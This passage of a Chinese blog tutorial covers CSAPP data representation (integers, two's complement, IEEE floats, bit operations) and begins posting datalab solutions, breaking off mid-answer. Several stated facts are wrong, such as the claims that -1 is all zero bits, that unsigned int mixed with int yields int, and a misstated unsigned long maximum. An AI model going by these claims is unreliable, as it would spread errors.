class="keyword">void</span> *start,<span class="keyword">size_t</span> len)</span></span>&#123;    </span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2x &quot;</span>,*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(start+i));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>start</code> 参数为该对象的起始地址，<code>len</code> 参数为显示的字节数，可以任意定义变量调用这个函数来查看这个对象在内存中的排布，理解浮点数的时候这个函数非常有用。</p><p>来查看下面的一个例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_bytes</span><span class="params">(<span class="keyword">void</span> *start,<span class="keyword">size_t</span> len)</span></span>&#123;    </span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2x &quot;</span>,*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(start+i));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x=<span class="number">0x3039</span>;</span><br><span class="line">    show_bytes(&amp;x,<span class="keyword">sizeof</span>(x));</span><br><span class="line">    <span class="keyword">float</span> y=x;</span><br><span class="line">    show_bytes(&amp;y,<span class="keyword">sizeof</span>(y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现浮点数的输出在整数形态下为 <code>0x4640E400</code>。与整数的存储有着截然不同的结果，但是我们对这个结果的二进制适当移位就会发现它们有13个相匹配的位。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  0   0   0   0   3   0   3   9</span><br><span class="line">0000000000000000001000000111001</span><br><span class="line">            4   6   4   0   E   4   0   0</span><br><span class="line">         01000110010000001110010000000000</span><br></pre></td></tr></table></figure><p>我们也可以看到13个位刚好就是 <code>int</code> 形式下的低 <code>13</code> 位，这并不是巧合，大家可以试试看其它数，并且可以看看它最多能匹配多少位的整数，但是要注意结论需要有一般性，特殊的数字符合并不能得出什么结论，只能说是特性。</p><h3 id="表示字符串"><a href="#表示字符串" class="headerlink" title="表示字符串"></a>表示字符串</h3><p>字符串的定义就是一个以 <code>null</code> 字符结尾的字符数组，如果将字符串看成一个数据类型的话，那么它是以大端形式存储的，但是其实实际上应该说是数组是大端存储的。我们在书写的时候，一般下标 <code>0 </code>是最小的，但是我们习惯把它称为高位，高位在低地址便是大端序。比如 <code>char s[]=&quot;1234&quot;;</code> 那么 <code>s[0]=&#39;1&#39;,s[1]=&#39;2&#39;,s[2]=&#39;3&#39;,s[3]=4,s[4]=NULL</code>。请注意末尾的空字节也会包括在字符串里面，但是我们算长度不会算上这个字节。在 <code>gcc</code> 编译器中，我们编译如下的程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> s[]=<span class="string">&quot;0123456789ABCDEF&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(buf,s);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译器会发出可能存在溢出的警告，因为在拷贝的时候会多携带一个 <code>0</code> 字节过来，这在后面堆利用中也是很常见的 <code>off by null</code> 的手段。</p><p>再比如我们用这样的方式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> s[]=<span class="string">&quot;0123456789ABCDEF&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="keyword">sizeof</span>(s));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行我们也可以发现这个 <code>char</code> 数组占用了 <code>17</code> 个字节的空间。</p><h3 id="布尔代数简介"><a href="#布尔代数简介" class="headerlink" title="布尔代数简介"></a>布尔代数简介</h3><p>布尔代数是一个建立在二元集合集合 <code>G=&#123;0,1&#125;</code> 上的定义。</p><h4 id="非"><a href="#非" class="headerlink" title="非"></a>非</h4><blockquote><p>非0即为1，非非0即为0。</p></blockquote><h4 id="与"><a href="#与" class="headerlink" title="与"></a>与</h4><blockquote><p>全1为1，不全1为0</p></blockquote><h4 id="或"><a href="#或" class="headerlink" title="或"></a>或</h4><blockquote><p>全0为0，不全0为1</p></blockquote><h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><blockquote><p>相同为0，不同为1</p></blockquote><hr><h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><ol><li>非0为1，非1为0</li><li>1与1为1，1与0为0，0与1为0，0与0为0</li><li>1或1为1，1或0为1，0或1为1，0或0为0</li><li>1异或1为0，1异或0为1，0异或1为1，0异或0为0</li></ol><p>在C语言中也有一个类型是 <code>bool</code>，它们有特殊的运算符：</p><ul><li>与：&amp;&amp;</li><li>或：||</li><li>非：!</li></ul><p>不一样的是，在进行这些运算的时候，统统会把参与运算的值转为 <code>bool</code> 类型，<code>0</code> 就是 <code>0</code>，不是 <code>0</code> 一律都是 <code>1</code></p><h3 id="C语言当中的位级运算"><a href="#C语言当中的位级运算" class="headerlink" title="C语言当中的位级运算"></a>C语言当中的位级运算</h3><h4 id="位逻辑运算"><a href="#位逻辑运算" class="headerlink" title="位逻辑运算"></a>位逻辑运算</h4><p>我们平时C语言的位运算会扩展到每一位，位之间独立地运算，我们可以把一个整数(int)视为32维的向量，每个维度为0或者1，对整数进行位逻辑运算相当于每一位分别做逻辑运算，每一位结果为新向量对应位的结果。在 <code>C</code> 语言中，以上逻辑运算对应的符号分别为：</p><ul><li>非：~</li><li>与：&amp;</li><li>或：|</li><li>异或：^</li></ul><p>我们可以在只拥有非和其它任意一个双目运算来实现所有的位逻辑运算。</p><p>比如我不用异或实现异或的功能，那么就是：</p><p>一个为 <code>1</code>，一个为 <code>0</code> 那么为或者一个为 <code>0</code>，一个为 <code>1</code> 的情况都是 <code>1</code>，其余都是 <code>0</code>。我们知道与的特性就是只有全 <code>1</code> 的时候为 <code>0</code>，那么如果我其中一个取非了，再与还是1的话就说明一个为 <code>1</code> 一个为 <code>0</code> 了，两边都非一下，最后把符合条件的位或一下就能得到异或的结果了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">xor</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (~x&amp;y)|(x&amp;~y)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那与和或，把非运用到位了它们两个也能运用自如自由转换。</p><p>比如我用与和非实现或，首先我对两个元素都非一下然后与起来，是不是就变成了：</p><p>全 <code>0</code> 为 <code>1</code>，其余为 <code>0</code> 了，这和或的全 <code>0</code> 为 <code>0</code>，其余为 <code>1</code> 差了什么？很显然结果反了，那么我就对结果再非一下，最后就变成了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">or</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> ~(~x&amp;~y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或和非实现与运算同理。</p><h4 id="移位运算"><a href="#移位运算" class="headerlink" title="移位运算"></a>移位运算</h4><p>这里分逻辑移位和算数移位，其实差不多，只不过逻辑移位适用无符号整数，算数移位适用有符号整数。</p><p>分左移和右移，分别用符号 <code>&lt;&lt;</code> 和 <code>&gt;&gt;</code> 来表示，假设整数一共 <code>w</code> 位，右移 <code>n</code> 位表示丢弃低 <code>n</code> 位，原来的高<code>w-n</code> 位变为低 <code>w-n</code> 位，高 <code>n</code> 位变为0。左移 <code>n</code> 位表示丢弃高 <code>n</code> 位，原来的低 <code>w-n</code> 位变为高 <code>w-n</code> 位，低 <code>n</code> 位变为0。</p><h5 id="逻辑移位"><a href="#逻辑移位" class="headerlink" title="逻辑移位"></a>逻辑移位</h5><p>左移右移就是字面意思</p><h5 id="算数移位"><a href="#算数移位" class="headerlink" title="算数移位"></a>算数移位</h5><p>正数与逻辑移位一样，负数则会在右移的时候高位添1.</p><hr><p>左移x相当于对该数乘 <code>2</code> 的 <code>x</code> 次方，右移相当于对该数除 <code>2</code> 的 <code>x</code> 次方取整。</p><p>当移位的位数大于等于该整数的最大位数，则会取模再移位。</p><h3 id="整数表示"><a href="#整数表示" class="headerlink" title="整数表示"></a>整数表示</h3><p>整数我们之前讲过了它的字节排布规律，但是对于负数计算机又将如何处理呢？</p><h4 id="整数数据类型"><a href="#整数数据类型" class="headerlink" title="整数数据类型"></a>整数数据类型</h4><p>我们先来看一张表格</p><table><thead><tr><th>C定义</th><th>最小值</th><th>最大值</th></tr></thead><tbody><tr><td>char</td><td>-128</td><td>127</td></tr><tr><td>unsigned char</td><td>0</td><td>255</td></tr><tr><td>short</td><td>-32768</td><td>32767</td></tr><tr><td>unsigned short</td><td>0</td><td>65535</td></tr><tr><td>int</td><td>-2147483648</td><td>2147483647</td></tr><tr><td>unsigned int</td><td>0</td><td>4294967295</td></tr><tr><td>long</td><td>-9223372036854775808</td><td>9223372036854775807</td></tr><tr><td>unsigned long</td><td>0</td><td>18446744037709551615</td></tr></tbody></table><p>我们可以很清楚地看到，有符号数在正数和负数的范围并不严格对称，这是为什么我们接下来再看。</p><h4 id="无符号数的编码"><a href="#无符号数的编码" class="headerlink" title="无符号数的编码"></a>无符号数的编码</h4><p>无符号数的编码就是用一个固定长度的向量来表示，每个维度上的值取 <code>0</code> 或者 <code>1</code>，那么有</p><p><img src="/2022/06/03/CSAPP_Datalab/3.png" alt="3"></p><p>这个是我们最容易理解的。</p><h4 id="补码编码"><a href="#补码编码" class="headerlink" title="补码编码"></a>补码编码</h4><p>有符号数因为需要表示负数，因此它规定：最高位的权值为负。</p><p>也就是说若最高位为1，而我们知道，在等比数列 <code>ai=2^i</code> 中，数列的前n项和永远比第 <code>n+1</code> 项小 <code>1</code>，根据等比数列前 <code>n</code> 项和的公式。因此若最高位为1，那么其它位不管是是怎样都不会使这个数变为一个正数。而前 <code>n-1</code> 项可以表示 <code>0~2^n-1</code> 的范围，所以负数的范围就是<code>-2^n+0~-2^n+2^n-1</code> 也就是我们熟知的 <code>-2^n~-1</code> 再加上正数表示的 <code>0~2^n-1</code> 连起来的范围就是 <code>-2^n~2^n-1</code> 啦。</p><h4 id="有符号与无符号数之间的转换"><a href="#有符号与无符号数之间的转换" class="headerlink" title="有符号与无符号数之间的转换"></a>有符号与无符号数之间的转换</h4><p>隐式转换按顺序遵从以下原则：</p><ol><li>浮点数参与运算就是浮点数，出现过double则结果一定为double</li><li>若都是整数参与运算则结果也是整数</li><li>整数运算的结果为出现过的位数最大的整数，若最大的整数中有无符号类型的则结果无符号。</li></ol><p>因此，如果</p><ul><li>运算中有 <code>unsigned short</code> 和 <code>int</code> 则结果为 <code>int</code>。</li><li>运算中有 <code>unsigned int</code> 和 <code>int</code> 则结果为 <code>int</code>。</li><li>运算中有 <code>unsigned int</code> 和 <code>float</code> 则结果为 <code>float</code>。</li></ul><p>也就不一一列举了。</p><p>有符号与无符号的位于区别就是最高位的权值正负问题，比较的时候任意一方出现无符号则另一方也会变成无符号比较，所以如果我们做以下运算：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&lt;(<span class="keyword">unsigned</span>)<span class="number">1</span></span><br></pre></td></tr></table></figure><p>会发现它结果为0.</p><p>因为 <code>-1</code> 的补码全为 <code>0</code>，转为无符号之后会变成无符号整数的最大值。</p><h4 id="扩展一个数字的表示"><a href="#扩展一个数字的表示" class="headerlink" title="扩展一个数字的表示"></a>扩展一个数字的表示</h4><p>将一个位数较小的整数扩展为位数较大的整数非常简单，我们只需要在开头添加 <code>0</code> 即可，但是如果是负数，则需要开头添 <code>1</code>，我们运行以下代码试试看：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_bytes</span><span class="params">(<span class="keyword">void</span> *start,<span class="keyword">size_t</span> len)</span></span>&#123;    </span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2x &quot;</span>,*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(start+i));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">short</span> x=<span class="number">0x1234</span>;</span><br><span class="line"><span class="keyword">short</span> y=<span class="number">-0x1234</span>;</span><br><span class="line">show_bytes(&amp;x,<span class="keyword">sizeof</span>(x));</span><br><span class="line">show_bytes(&amp;y,<span class="keyword">sizeof</span>(y));</span><br><span class="line"><span class="keyword">int</span> x1=x;</span><br><span class="line"><span class="keyword">int</span> y1=y;</span><br><span class="line">show_bytes(&amp;x1,<span class="keyword">sizeof</span>(x1));</span><br><span class="line">show_bytes(&amp;y1,<span class="keyword">sizeof</span>(y1));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行可以看到结果如我们所说。</p><p><img src="/2022/06/03/CSAPP_Datalab/4.png" alt="4"></p><h4 id="截断数字"><a href="#截断数字" class="headerlink" title="截断数字"></a>截断数字</h4><p>有扩展，自然有截断，当运算的结果可能超出类型所能表示的最大范围的时候，就会发生溢出。</p><p>在无符号数或者正数当中，截断为 <code>w</code> 位的整数就相当于取模 <code>2^w</code> ，但是截断有负整数的时候就会发生意想不到的事情。比如负数最小值再减一那么做的运算就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> 0x80000000</span><br><span class="line"> 0xFFFFFFFF</span><br><span class="line">0x17FFFFFFF</span><br></pre></td></tr></table></figure><p>显然多了一位，高位被截断，最终结果为 <code>0x7FFFFFFF</code> ，两个负数相加结果得出了正数，这显然超出了我们的认知范围。这个我们叫它负溢出。再看一个例子：正数的最大值加 <code>1</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7FFFFFFF</span><br><span class="line">0x00000001</span><br><span class="line">0x80000000</span><br></pre></td></tr></table></figure><p>结果是负数的最大值，两个正数相加得出了负数，显然也不合理，这个我们叫他正溢出，但是正溢出并没有发生截断，而负溢出是由截断引起的。</p><blockquote><p>计算机历史上，有很多安全漏洞都是因为有符号和无符号的正数引起的</p></blockquote><h4 id="无符号乘法"><a href="#无符号乘法" class="headerlink" title="无符号乘法"></a>无符号乘法</h4><p>对于乘法有 <code>x*y=(x*y) mod 2^w</code> 其中 <code>w</code> 为 <code>x </code> 和 <code>y</code> 的位数。因为 <code>x</code> 和 <code>y</code> 相乘可能得到最大 <code>2w</code> 位的整数，因此会发生截断，对于无符号来说，截断就相当于对 <code>2^w</code> 取模 。</p><h4 id="补码乘法"><a href="#补码乘法" class="headerlink" title="补码乘法"></a>补码乘法</h4><p>这个乘法就相当于先像无符号乘法，乘出来截断之后再转为补码就是结果。</p><h4 id="乘常数"><a href="#乘常数" class="headerlink" title="乘常数"></a>乘常数</h4><p>因为我们知道一个特性：移位运算相当于对 <code>2^x</code> 做乘除法，因此利用这个特性我们能把乘法转成移位运算，执行乘法指令的时间比其它指令时间要长的多，因此很多编译器在编译常数乘法的时候会把常数二进制拆开然后分别相乘相加。</p><p>比如乘9：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">9</span>=<span class="number">0b1001</span></span><br><span class="line">x*<span class="number">9</span>=x*<span class="number">8</span>+x*<span class="number">1</span>=(x&lt;&lt;<span class="number">3</span>)+(x&lt;&lt;<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p> 但是我们会发现一个问题：如果1的位数很多那就相当于要做很多次移位和加法，最后的复杂度可能跟乘法指令差不多，但是我们可以通过另外一种姿势避免这个问题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">15</span>=<span class="number">0b1111</span>=<span class="number">0b10000</span><span class="number">-0b</span>1</span><br><span class="line">x*<span class="number">15</span>=x*<span class="number">16</span>-x*<span class="number">1</span>=(x&lt;&lt;<span class="number">4</span>)-(x&lt;&lt;<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>通过借一个高位，其余位权值取反之后再加1的方式避免了进行大量的运算。</p><h4 id="除2的幂"><a href="#除2的幂" class="headerlink" title="除2的幂"></a>除2的幂</h4><p>对于2的幂，非常简单，右移运算即可，但是需要注意：除法没有分配律，所以乘常数的方式并不适用于除法。除法会向零取整，比如算出来结果为 <code>3.5</code> 则会变成 <code>3</code>，算出来结果 <code>-3.5</code> 则会变成 <code>-3</code>。</p><h3 id="浮点数表示"><a href="#浮点数表示" class="headerlink" title="浮点数表示"></a>浮点数表示</h3><p>显然整数并不能满足我们平时的需要，平时还需要进行大量的浮点数运算，达到太阳的质量，小到电子的质量，都需要能在计算机中表示。而这个范围要用整数的思路表示显然是不行的，因此我们需要有特殊的表示方法。</p><h4 id="二进制小数"><a href="#二进制小数" class="headerlink" title="二进制小数"></a>二进制小数</h4><p>我们都知道十进制的小数，小数点左边的数字位的权值从 <code>10^0</code> 开始，指数逐位递增，而小数点右边的数字的位的权值从 <code>10^(-1)</code> 开始，逐位递减。</p><p>二进制同理，只不过权值的底数都变成了 <code>2</code>。</p><h4 id="IEEE浮点数表示"><a href="#IEEE浮点数表示" class="headerlink" title="IEEE浮点数表示"></a>IEEE浮点数表示</h4><p>这个标准规定的浮点数用如下方式表示：</p><p><img src="/2022/06/03/CSAPP_Datalab/5.png" alt="5"></p><p>里面包含了</p><ul><li>符号(s)：<code>1</code> 表示负数，<code>0</code> 表示正数</li><li>尾数(M)：是一个二进制的小数，取值范围为 <code>[1,2)</code></li><li>阶码(E)：为浮点数加权。</li></ul><p>其实这个定义就相当于二进制的科学计数法，想想原来科学计数法的定义是不是能更清晰地理解它了呢？</p><p>讲完理论来讲点实际的：</p><p>我们知道实际上我们经常用的浮点数有两类，一类是 <code>float</code> 一类是 <code>double</code>，<code>float</code> 为 <code>32</code> 位，<code>double</code> 为 <code>64</code> 位。</p><ul><li>对于 <code>float</code>，最高位表示符号位，第 <code>2</code> 到第 <code>9</code> 位表示阶码，第 <code>10</code> 位到第 <code>32</code> 位均为尾数</li><li>对于 <code>double</code>，最高位表示符号位，第 <code>2</code> 到第 <code>12</code> 位表示阶码，第 <code>13</code> 位到第 <code>64</code> 位均为尾数</li></ul><p>我们具体以 <code>float</code> 来分析：</p><p>第一位是符号位没啥大问题。后面的八位是指数，这个指数需要能表示无穷大，也要能表示无穷小，因此指数必须有正有负。我们定义一个数 <code>Bias=2^(k-1)-1</code> 其中 <code>k</code> 为阶码的位数，在 <code>float</code> 中，这个值为 <code>127</code>，在 <code>double</code> 中，这个值为 <code>1023</code>。阶码实际值 <code>E=e-Bias</code>，其中 <code>e</code> 表示阶码本身的无符号二进制的数值。然后就是这个尾数了，因为我们的范围是 <code>[1,2)</code>，在这个范围内的小鼠，不难发现小数点前有一位一直是 <code>0</code>，因此这个 <code>0</code> 我们就不必多花一位存储它了，因此我们的尾数都是小数点后的值。</p><p>如果一个 <code>32</code> 位浮点数在内存中的二进制表示如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bin:<span class="number">0b01000000010000000000000000000</span></span><br><span class="line">hex:<span class="number">0x40400000</span></span><br></pre></td></tr></table></figure><p>那么可以发现它是正数，阶码为 <code>128</code>，尾数为 <code>100000……</code>，因为小数点后面的0都能忽略，因此尾数实际就是 <code>1</code>。然后注意这个阶码并不是真正的实际值，这只是它表面上看上去的值，再给它减去一个 <code>127</code> 之后可以发现指数为 <code>1</code>。小数位数因为有一个隐含的 <code>1</code>，所以它的实际值为 <code>1.1</code>，十进制值就是 <code>1.5</code>，所以最后结果就是 <code>1.5*2^1=3</code>。</p><p>然后我们再运行程序看看 <code>3</code> 的字节显示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_bytes</span><span class="params">(<span class="keyword">void</span> *start,<span class="keyword">size_t</span> len)</span></span>&#123;    </span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2x &quot;</span>,*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(start+i));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">float</span> x=<span class="number">3.0</span>;</span><br><span class="line">show_bytes(&amp;x,<span class="keyword">sizeof</span>(x));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行之后可以发现与我们上面书写的十六进制值一致。</p><p>浮点数还有 <code>3 </code>中表示值的情况。</p><ol><li>规格化的值：这是最普遍的情况，阶码位不为全 <code>0</code> 也不为全 <code>1</code>.</li><li>非规格化的值：当阶码位全为 <code>0</code> 的时候，表示非规格化的值，这个非规格化的意思就是跟我们上面介绍的规律稍稍有点不一样，此时尾数是不带隐含的 <code>1</code> 的，也就是说它的有效数字直接是从尾数开始的，因此它和阶码位模式为<code>00000001</code> 的指数一样，但是有效数字多一个小数点前的 <code>1</code>，因为这样表示能够使得非规格化数值向规格化数值转化更为平滑。</li><li>特殊值：包括 <code>INF</code> 和 <code>NAN</code>，阶码位全为 <code>1</code> 的时候，若尾数全为0，则得到 <code>INF</code>，若不全为 <code>0</code> 则得到 <code>NAN</code>。</li></ol><h4 id="舍入"><a href="#舍入" class="headerlink" title="舍入"></a>舍入</h4><p>浮点数因为表达的不是一个具体的数，只是一个近似值，因此在精度不够的情况，只能选择舍掉一些精度保证能够存储。如何舍入便成为了一项难题，目前一共有四种舍入方式：下面我们给出一些例子</p><table><thead><tr><th>方式</th><th>1.40</th><th>1.60</th><th>1.50</th><th>2.50</th><th>-1.50</th></tr></thead><tbody><tr><td>向偶数舍入</td><td>1</td><td>2</td><td>2</td><td>2</td><td>-2</td></tr><tr><td>向零舍入</td><td>1</td><td>1</td><td>1</td><td>2</td><td>-1</td></tr><tr><td>向下舍入</td><td>1</td><td>1</td><td>1</td><td>2</td><td>-2</td></tr><tr><td>向上舍入</td><td>2</td><td>2</td><td>2</td><td>3</td><td>-1</td></tr></tbody></table><p>后面三个方式还好，应该都能理解，主要是这个向偶数舍入，它首先满足：被舍入的值不超过最小单位的一半则丢弃，若超过一半则加上一个最小单位，若等于一半则一定会使得舍入的结果为偶数个最小计量单位。</p><h4 id="浮点运算"><a href="#浮点运算" class="headerlink" title="浮点运算"></a>浮点运算</h4><p>在进行浮点数加减法的时候，首先需要对阶，小阶向大阶对齐，然后尾数相加。由于特殊值的存在，浮点数加减法并不满足交换规则，因此它不是一个阿贝尔群，很多整数规律不适用。</p><p>比如最经典的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1+1e111-1e111!=1e111-1e111+1</span><br></pre></td></tr></table></figure><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>这里来回答一下之前遗留的一个问题，那就是为什么整数转为浮点数之后会有部分位相匹配。其实不难发现是因为浮点数的尾数基本是和原二进制的值一致的。比如下面的一个数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1001001010101</span><br></pre></td></tr></table></figure><p>转为浮点数之后就会变成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.001001010101*2^12</span><br></pre></td></tr></table></figure><p>这个尾数是与原二进制的值一致的，想到这里你肯定明白了之前的那个问题了。</p><h2 id="CSAPP-datalab"><a href="#CSAPP-datalab" class="headerlink" title="CSAPP:datalab"></a>CSAPP:datalab</h2><p>终于到了最激动的实验环节了，原先我对这本书并没有很深的了解，直接上手做的实验，不会就搜，现在看完一遍之后感觉理解很多，做实验基本也是畅通无阻。</p><p>用给定的运算符实现函数的功能，解压得到源码之后在 <code>bits.c</code> 中编写自己的代码，然后要查看结果可以使用如下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$make</span><br><span class="line">$./btest</span><br></pre></td></tr></table></figure><p>实验规定并非强制，但是想获得提升还是严格遵守它给定的条件。</p><h3 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp; </span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只允许使用位运算 <code>~</code> 和 <code>&amp;</code> 实现按位异或，这个我们在上面有写过，只不过没有合在一起，稍微转换一下即可，反正实现的思想就是要位之间不一样才返回 <code>1</code>。</p><h4 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> 